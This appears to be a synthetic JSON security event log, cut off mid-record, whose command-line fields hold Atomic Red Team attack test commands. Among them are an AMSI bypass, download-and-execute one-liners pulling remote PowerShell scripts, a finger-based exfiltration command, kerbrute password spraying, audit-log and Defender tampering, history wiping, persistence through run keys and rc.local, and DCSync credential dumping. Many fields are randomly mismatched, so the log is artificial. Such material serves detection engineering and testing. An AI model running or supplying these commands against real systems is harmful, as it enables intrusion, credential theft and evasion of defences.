    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-61.simmons.info",
        "User": "rpruitt",
        "ProcessID": 9584,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"IF \\\"%PROCESSOR_ARCHITECTURE%\\\"==\\\"AMD64\\\" (C:\\\\Windows\\\\syswow64\\\\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\\\\#{regsvr32name} /s #{dll_name} )\\n\",",
        "LogonID": 385862,
        "LogonGuid": "102bbffa-2eea-4711-bd15-b6b833b2e91a",
        "SourceProcessID": 9624,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\situation..exe",
        "DestinationProcessID": 3765,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\performance..dll",
        "UtcTime": "2024-05-17T01:36:51.630524Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-79.osborne.biz",
        "User": "gabriel39",
        "ProcessID": 1268,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Get-Service WinDefend #check the service state of Windows Defender\\nGet-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc\\nGet-MpThreat #threats details that have been detected using MS Defender\\n\",",
        "LogonID": 251064,
        "LogonGuid": "4abbed32-703e-4cbf-b889-cd8b92b73968",
        "SourceProcessID": 4619,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\stock..exe",
        "DestinationProcessID": 9316,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\character..exe",
        "UtcTime": "2024-05-17T01:36:51.630524Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-12.snyder.net",
        "User": "oespinoza",
        "ProcessID": 1761,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"dscl . -delete /Users/#{user_account} #enter admin password\\n\",",
        "LogonID": 899324,
        "LogonGuid": "f964061e-674a-4a65-8864-a638066b1961",
        "SourceProcessID": 7562,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\rise..dll",
        "DestinationProcessID": 3445,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\positive..exe",
        "UtcTime": "2024-05-17T01:36:51.630524Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-47.burke.com",
        "User": "shawndawson",
        "ProcessID": 4167,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe /out:#{output_file} \\\"#{input_file}\\\"\\n\",",
        "LogonID": 646857,
        "LogonGuid": "791f725d-bb18-4b81-a2c6-5264b45467b2",
        "SourceProcessID": 4734,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\food..dll",
        "DestinationProcessID": 9003,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\various..exe",
        "UtcTime": "2024-05-17T01:36:51.630524Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-41.snyder.com",
        "User": "mikeleach",
        "ProcessID": 3379,
        "ProcessName": "nc.exe",
        "CommandLine": "\"uname -a >> #{output_file}\\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi\\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   \\nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi\\nif [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi\\nuptime >> #{output_file}\\ncat #{output_file} 2>/dev/null\\n\",",
        "LogonID": 482780,
        "LogonGuid": "dda67bfc-3634-4386-92e7-c9aa8bc33478",
        "SourceProcessID": 9333,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\read..exe",
        "DestinationProcessID": 6358,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\nothing..exe",
        "UtcTime": "2024-05-17T01:36:51.631522Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-79.jenkins-soto.com",
        "User": "gonzalezdillon",
        "ProcessID": 9115,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"sudo #{program_path} -f -i #{ifname} -t 3\\n\",",
        "LogonID": 958427,
        "LogonGuid": "dc6b8407-9020-4da0-abed-0a847c442713",
        "SourceProcessID": 2044,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\born..exe",
        "DestinationProcessID": 3991,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\standard..dll",
        "UtcTime": "2024-05-17T01:36:51.631522Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-57.harris-jensen.org",
        "User": "fostermichael",
        "ProcessID": 2248,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v NoClose /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 135553,
        "LogonGuid": "802fc9da-401f-4c3e-bae8-2fae9be98211",
        "SourceProcessID": 6816,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\prevent..dll",
        "DestinationProcessID": 1939,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\down..dll",
        "UtcTime": "2024-05-17T01:36:51.631522Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-60.kim.com",
        "User": "robertsilva",
        "ProcessID": 3264,
        "ProcessName": "nc.exe",
        "CommandLine": "\"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi\\n[ \\\"$(uname)\\\" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\\\\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local\\necho \\\"\\\\npython3 -c \\\\\\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\\\\\"\\\" | sudo tee -a /etc/rc.local\\nprintf 'exit 0' | sudo tee -a /etc/rc.local\\nsudo chmod +x /etc/rc.local\\n\",",
        "LogonID": 452796,
        "LogonGuid": "f0d4aa98-33c0-4c8a-8c08-5aec919cc4b7",
        "SourceProcessID": 2259,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\maybe..exe",
        "DestinationProcessID": 7636,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\church..dll",
        "UtcTime": "2024-05-17T01:36:51.631522Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-56.byrd.com",
        "User": "kayla47",
        "ProcessID": 2753,
        "ProcessName": "nc.exe",
        "CommandLine": "\"&\\\"#{renamed_binary}\\\" \\\"#{xml_payload}\\\" output.txt\\n\",",
        "LogonID": 643582,
        "LogonGuid": "90fd6ce5-f99b-4800-a670-3ff961e11079",
        "SourceProcessID": 2746,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\walk..dll",
        "DestinationProcessID": 5012,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\also..exe",
        "UtcTime": "2024-05-17T01:36:51.632522Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-34.james.com",
        "User": "krichard",
        "ProcessID": 3708,
        "ProcessName": "malware.exe",
        "CommandLine": "\"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\\n\",",
        "LogonID": 191996,
        "LogonGuid": "991c5837-36aa-42dd-b913-2d7074ae2f54",
        "SourceProcessID": 8696,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\past..dll",
        "DestinationProcessID": 8579,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\space..dll",
        "UtcTime": "2024-05-17T01:36:51.632522Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-93.adams.com",
        "User": "vmontgomery",
        "ProcessID": 2938,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \\\"#{query_type}\\\" \\\"#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\\\" -QuickTimeout}\\n\",",
        "LogonID": 424494,
        "LogonGuid": "494fa083-d617-48bc-a70c-ad0df1730289",
        "SourceProcessID": 9928,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\where..exe",
        "DestinationProcessID": 2813,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\bag..dll",
        "UtcTime": "2024-05-17T01:36:51.632522Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-46.parker.com",
        "User": "kristina89",
        "ProcessID": 9157,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"tail /var/log/ufw.log\\n\",",
        "LogonID": 883534,
        "LogonGuid": "9600f4d4-3790-48e2-85ce-fd5ca38a5770",
        "SourceProcessID": 5733,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\end..dll",
        "DestinationProcessID": 3591,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\experience..exe",
        "UtcTime": "2024-05-17T01:36:51.632522Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-26.leon.info",
        "User": "samanthawright",
        "ProcessID": 3915,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Set-PSReadLineOption -AddToHistoryHandler { return $false }\\n\",",
        "LogonID": 733224,
        "LogonGuid": "fef5a0eb-0c8f-4cbd-a56c-b49ebde4a566",
        "SourceProcessID": 7065,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\rich..dll",
        "DestinationProcessID": 4100,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\likely..exe",
        "UtcTime": "2024-05-17T01:36:51.632522Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-78.chang.biz",
        "User": "jenniferclark",
        "ProcessID": 7448,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sdbinst.exe \\\"#{file_path}\\\"\\n\",",
        "LogonID": 202596,
        "LogonGuid": "b7753fee-2194-4866-9c98-9008071a20a8",
        "SourceProcessID": 7021,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\let..dll",
        "DestinationProcessID": 4629,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\indeed..exe",
        "UtcTime": "2024-05-17T01:36:51.632522Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-41.molina-foster.biz",
        "User": "susan15",
        "ProcessID": 2860,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$Action = New-ScheduledTaskAction -Execute \\\"cmd.exe\\\"\\n$Trigger = New-ScheduledTaskTrigger -AtLogon\\n$User = New-ScheduledTaskPrincipal -GroupId \\\"BUILTIN\\\\Administrators\\\" -RunLevel Highest\\n$Set = New-ScheduledTaskSettingsSet\\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\\n$NewAction = New-ScheduledTaskAction -Execute \\\"Notepad.exe\\\"\\nSet-ScheduledTask \\\"AtomicTaskModifed\\\" -Action $NewAction\\n\",",
        "LogonID": 231462,
        "LogonGuid": "f4040957-71be-4b4c-8c08-7ac24879389a",
        "SourceProcessID": 3431,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\modern..exe",
        "DestinationProcessID": 2109,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\table..exe",
        "UtcTime": "2024-05-17T01:36:51.632522Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-20.young.net",
        "User": "ulucero",
        "ProcessID": 3709,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"odbcconf.exe /S /A {REGSVR \\\"#{dll_payload}\\\"}\\n\",",
        "LogonID": 873678,
        "LogonGuid": "27043c34-b564-4bfa-b4f2-4b5361e5b0d4",
        "SourceProcessID": 3214,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\arm..dll",
        "DestinationProcessID": 5565,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\later..exe",
        "UtcTime": "2024-05-17T01:36:51.634032Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-83.romero-whitaker.com",
        "User": "qking",
        "ProcessID": 7083,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"& \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" #{optional_args} -h #{domain} -s subtree -f \\\"objectclass=computer\\\" *\\n\",",
        "LogonID": 431184,
        "LogonGuid": "fa35ac9b-c3d2-444d-b11d-94cbed55b785",
        "SourceProcessID": 8639,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\base..exe",
        "DestinationProcessID": 9475,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\deal..exe",
        "UtcTime": "2024-05-17T01:36:51.634032Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-81.bernard.com",
        "User": "rayjennifer",
        "ProcessID": 2683,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"set comspec=#{command_to_execute}\\ncscript %windir%\\\\System32\\\\manage-bde.wsf\\n\",",
        "LogonID": 349036,
        "LogonGuid": "ec7cc825-9c8f-4f3f-909f-d66bff49b58a",
        "SourceProcessID": 5499,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\between..exe",
        "DestinationProcessID": 6299,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\government..exe",
        "UtcTime": "2024-05-17T01:36:51.634032Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-42.carpenter.org",
        "User": "gregory74",
        "ProcessID": 8218,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'\\n\",",
        "LogonID": 201303,
        "LogonGuid": "1482a4dc-bb8c-4244-800f-3ecd005d6524",
        "SourceProcessID": 4422,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\create..dll",
        "DestinationProcessID": 7979,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\someone..exe",
        "UtcTime": "2024-05-17T01:36:51.634032Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-58.cain.com",
        "User": "umeyer",
        "ProcessID": 6666,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"cd \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\"\\n.\\\\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\passwordspray.txt\\\" password132 \\n\",",
        "LogonID": 678821,
        "LogonGuid": "3d12c476-2ea7-4dd0-81ee-98e043cd289d",
        "SourceProcessID": 3444,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\institution..dll",
        "DestinationProcessID": 8771,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\someone..dll",
        "UtcTime": "2024-05-17T01:36:51.635041Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-28.perez-rhodes.com",
        "User": "krista15",
        "ProcessID": 3218,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"find / -path \\\"*/Safari/Bookmarks.plist\\\" 2>/dev/null >> #{output_file} \\ncat #{output_file} \\n\",",
        "LogonID": 674374,
        "LogonGuid": "f77ca339-5dfd-48a4-8b7d-74951d026e22",
        "SourceProcessID": 2790,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\pass..dll",
        "DestinationProcessID": 2870,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\set..exe",
        "UtcTime": "2024-05-17T01:36:51.635041Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-89.watson.biz",
        "User": "romeromichael",
        "ProcessID": 4713,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"cd \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\"\\n.\\\\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\\\\bruteuser.txt TestUser1 \\n\",",
        "LogonID": 961353,
        "LogonGuid": "e9533686-48eb-4978-a5b9-b0f3cd7c34c6",
        "SourceProcessID": 7436,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\civil..dll",
        "DestinationProcessID": 1035,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\nature..exe",
        "UtcTime": "2024-05-17T01:36:51.635041Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-82.phelps-williams.com",
        "User": "aaronsmith",
        "ProcessID": 3782,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nsessionGopher -noninteractive -consoleoutput\",",
        "LogonID": 159794,
        "LogonGuid": "a3bd3e1a-dfaa-4341-a12b-016c79dab660",
        "SourceProcessID": 4667,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\produce..dll",
        "DestinationProcessID": 9474,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\often..dll",
        "UtcTime": "2024-05-17T01:36:51.635041Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-56.christensen.com",
        "User": "william54",
        "ProcessID": 4210,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"pw useradd art -g wheel -s /bin/sh\\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\\npw lock art\\npw usermod art -e +1d\\npw unlock art\\npw user mod art -e +99d\\nsu art\\nwhoami\\nexit\\n\",",
        "LogonID": 983605,
        "LogonGuid": "56426491-2b06-40a8-b0cb-75dbcc0d8841",
        "SourceProcessID": 4488,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\visit..dll",
        "DestinationProcessID": 3348,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\floor..exe",
        "UtcTime": "2024-05-17T01:36:51.635041Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-13.williams.org",
        "User": "carolriley",
        "ProcessID": 9235,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"reboot\\n\",",
        "LogonID": 842531,
        "LogonGuid": "2255357a-b0b5-4da6-94ac-aebd7d4246ac",
        "SourceProcessID": 8624,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\official..dll",
        "DestinationProcessID": 3225,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\set..dll",
        "UtcTime": "2024-05-17T01:36:51.635041Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-49.case-roberts.com",
        "User": "trevinodevin",
        "ProcessID": 6661,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"TEST=$(echo $HISTFILESIZE)\\necho $HISTFILESIZE\\nexport HISTFILESIZE=0\\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \\\"\\\\$HISTFILESIZE is zero\\\"; fi\\n# -> $HISTFILESIZE is zero\\n\",",
        "LogonID": 465044,
        "LogonGuid": "840fd578-6ed6-4d57-958e-712883a57b29",
        "SourceProcessID": 7492,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\amount..exe",
        "DestinationProcessID": 5578,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\far..exe",
        "UtcTime": "2024-05-17T01:36:51.636038Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-39.thompson.com",
        "User": "ashleywright",
        "ProcessID": 3539,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$excludedProcess = \\\"#{excluded_process}\\\"\\nAdd-MpPreference -ExclusionProcess $excludedProcess\",",
        "LogonID": 795421,
        "LogonGuid": "5af80430-e95f-4379-9d69-625c169dc7f4",
        "SourceProcessID": 1157,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\oil..dll",
        "DestinationProcessID": 8100,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\while..exe",
        "UtcTime": "2024-05-17T01:36:51.636038Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-85.brennan.com",
        "User": "amanda89",
        "ProcessID": 3138,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"REG ADD \\\"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" /V \\\"Atomic Red Team\\\" /t REG_SZ /F /D \\\"#{command_to_execute}\\\"\\n\",",
        "LogonID": 885365,
        "LogonGuid": "58b867bb-44b4-4e9c-ab1b-86d753c4634e",
        "SourceProcessID": 6503,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\first..dll",
        "DestinationProcessID": 9876,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\though..dll",
        "UtcTime": "2024-05-17T01:36:51.636038Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-39.landry.com",
        "User": "leegabriel",
        "ProcessID": 1027,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"env\\n\",",
        "LogonID": 636673,
        "LogonGuid": "839a691d-1e31-4d60-ab29-c0415517176e",
        "SourceProcessID": 8101,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\however..exe",
        "DestinationProcessID": 3296,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\fill..exe",
        "UtcTime": "2024-05-17T01:36:51.636038Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-22.ortiz.biz",
        "User": "gerald67",
        "ProcessID": 6636,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing) \\nInvoke-MalDoc -macroFile \\\"PathToAtomicsFolder\\\\T1053.005\\\\src\\\\T1053.005-macrocode.txt\\\" -officeProduct \\\"#{ms_product}\\\" -sub \\\"Scheduler\\\"\\n\",",
        "LogonID": 204051,
        "LogonGuid": "63643d8d-b987-4256-a32f-ce561155d6dc",
        "SourceProcessID": 9640,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\live..exe",
        "DestinationProcessID": 6685,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\interest..exe",
        "UtcTime": "2024-05-17T01:36:51.637039Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-54.mcclain.com",
        "User": "james38",
        "ProcessID": 6863,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo #{MimiPenguin_Location} > #{output_file}\\ncat #{output_file}\\n\",",
        "LogonID": 654001,
        "LogonGuid": "dd812bbc-fb33-4302-9333-e3887d6f4b21",
        "SourceProcessID": 7181,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\staff..exe",
        "DestinationProcessID": 1268,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\plan..exe",
        "UtcTime": "2024-05-17T01:36:51.637039Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-43.diaz.info",
        "User": "scott95",
        "ProcessID": 8745,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Start-Process -FilePath \\\"$Env:ProgramFiles\\\\Process Hacker 2\\\\#{processhacker_exe}\\\"\",",
        "LogonID": 339515,
        "LogonGuid": "d0605752-1dfe-4b43-bac2-3351e6c6f52d",
        "SourceProcessID": 8679,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\church..exe",
        "DestinationProcessID": 7800,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\bed..exe",
        "UtcTime": "2024-05-17T01:36:51.637039Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-01.yang.com",
        "User": "aaronlove",
        "ProcessID": 8466,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$secure_pwd = \\\"#{password}\\\" | ConvertTo-SecureString -AsPlainText -Force\\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $secure_pwd\\nConnect-ExchangeOnline -Credential $creds\\nSet-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False\\n\",",
        "LogonID": 651137,
        "LogonGuid": "90fee6b7-0cfa-4f5d-8eff-50549c3ce7b2",
        "SourceProcessID": 2678,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\interview..exe",
        "DestinationProcessID": 2777,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\industry..exe",
        "UtcTime": "2024-05-17T01:36:51.637039Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-97.bullock.info",
        "User": "jose06",
        "ProcessID": 1052,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"powershell.exe -exec bypass -noprofile \\\"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\\\"\\n\",",
        "LogonID": 294960,
        "LogonGuid": "910ba64d-7d2c-401f-b24e-181a0ec22b19",
        "SourceProcessID": 6447,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\director..exe",
        "DestinationProcessID": 6054,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\star..exe",
        "UtcTime": "2024-05-17T01:36:51.637039Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-91.hall.info",
        "User": "alansullivan",
        "ProcessID": 8053,
        "ProcessName": "nc.exe",
        "CommandLine": "\"finger base64_filedata@#{remote_host}\\n\",",
        "LogonID": 743445,
        "LogonGuid": "8c5bf837-4be4-490b-aa1a-fef242585dd0",
        "SourceProcessID": 6186,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\nor..exe",
        "DestinationProcessID": 9531,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\rise..dll",
        "UtcTime": "2024-05-17T01:36:51.638040Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-41.ruiz.com",
        "User": "tevans",
        "ProcessID": 9929,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Get-ADReplAccount -All -Server #{logonserver}\\n\",",
        "LogonID": 240682,
        "LogonGuid": "b6a1d473-6f18-4bfa-8161-5816d2bd5f9f",
        "SourceProcessID": 7912,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\we..exe",
        "DestinationProcessID": 2267,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\look..dll",
        "UtcTime": "2024-05-17T01:36:51.638040Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-88.chaney.org",
        "User": "donnacruz",
        "ProcessID": 3299,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)\\n\",",
        "LogonID": 186612,
        "LogonGuid": "94b1611f-e413-444c-8b81-311a9040f67f",
        "SourceProcessID": 5607,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\back..dll",
        "DestinationProcessID": 8560,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\above..dll",
        "UtcTime": "2024-05-17T01:36:51.638040Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-78.saunders.com",
        "User": "nicholasmyers",
        "ProcessID": 2700,
